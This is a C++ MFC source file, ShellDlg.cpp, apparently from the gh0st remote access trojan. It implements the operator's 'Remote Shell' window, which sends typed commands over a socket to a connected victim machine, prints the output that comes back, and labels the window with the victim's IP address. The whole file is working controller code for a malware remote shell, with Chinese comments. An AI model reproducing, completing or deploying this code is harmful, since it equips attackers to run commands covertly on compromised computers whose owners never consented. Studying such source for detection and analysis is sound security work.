// ShellDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ShellDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CShellDlg dialog


CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CShellDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CShellDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_nCurSel = 0;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));

	m_bOnClose =FALSE;
}


void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CShellDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	//{{AFX_MSG_MAP(CShellDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, OnChangeEdit)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()



/////////////////////////////////////////////////////////////////////////////
// CShellDlg message handlers
BOOL CShellDlg::PreTranslateMessage(MSG* pMsg) 
{
	USES_CONVERSION;

	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			int	len = m_edit.GetWindowTextLength();
			CString str;
			m_edit.GetWindowText(str);
			str += "\r\n";

			m_iocpServer->Send(m_pContext, (LPBYTE)(str.GetBuffer(0) + m_nCurSel), str.GetLength() - m_nCurSel);

			m_nCurSel = m_edit.GetWindowTextLength();

// 			int	len = m_edit.GetWindowTextLength();
// 			CString str;
// 			m_edit.GetWindowText(str);
// 			str += "\r\n";
// 			m_iocpServer->Send(
// 								m_pContext,
// 								(LPBYTE)A2W(str.GetBuffer(0) + m_nCurSel),
// 								(str.GetLength() - m_nCurSel)*2
// 								);
// 			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
 	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CShellDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - Remote Shell", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

//     CFont font;
// 	font.CreateFont(
// 		16,                        // nHeight
// 		8,                         // nWidth
// 		0,                         // nEscapement
// 		0,                         // nOrientation
// 		FW_NORMAL,                 // nWeight
// 		FALSE,                     // bItalic
// 		FALSE,                     // bUnderline
// 		0,                         // cStrikeOut
// 		ANSI_CHARSET,              // nCharSet
// 		OUT_DEFAULT_PRECIS,        // nOutPrecision
// 		CLIP_DEFAULT_PRECIS,       // nClipPrecision
// 		DEFAULT_QUALITY,           // nQuality
// 		NULL,  // nPitchAndFamily
//         "System");                 // lpszFacename
// 
//     m_edit.SetFont(&font);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

void CShellDlg::AddKeyBoardData()
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);

	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	
	strResult.Replace(_T("\n"), _T("\r\n"));
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();

// 	int nBufLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
// 	char * lpszBuffer = (char *)malloc(nBufLen);
// 	RtlZeroMemory(lpszBuffer,nBufLen);
// 
// 	WideCharToMultiByte(
// 						CP_ACP,
// 						WC_COMPOSITECHECK,
// 						(LPCWSTR)m_pContext->m_DeCompressionBuffer.GetBuffer(0),
// 						-1,
// 						lpszBuffer,
// 						nBufLen / sizeof(WCHAR),
// 						NULL,
// 						NULL
// 						);
// 
// 	CString strResult = lpszBuffer;
// 
// 	strResult.Replace("\n", "\r\n");
// 	int	len = m_edit.GetWindowTextLength();
// 	m_edit.SetSel(len, len);
// 	m_edit.ReplaceSel(strResult);
// 	m_nCurSel = m_edit.GetWindowTextLength();
// 
// 	free(lpszBuffer);
}



void CShellDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);	
	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}

void CShellDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (IsWindowVisible())
	ResizeEdit();
}

void CShellDlg::OnChangeEdit() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	// 用户删除了部分内容，改变m_nCurSel
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
}

HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 0, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CShellDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if (!m_bOnClose)
		OnClose();
	
	delete this;
	CDialog::PostNcDestroy();
}

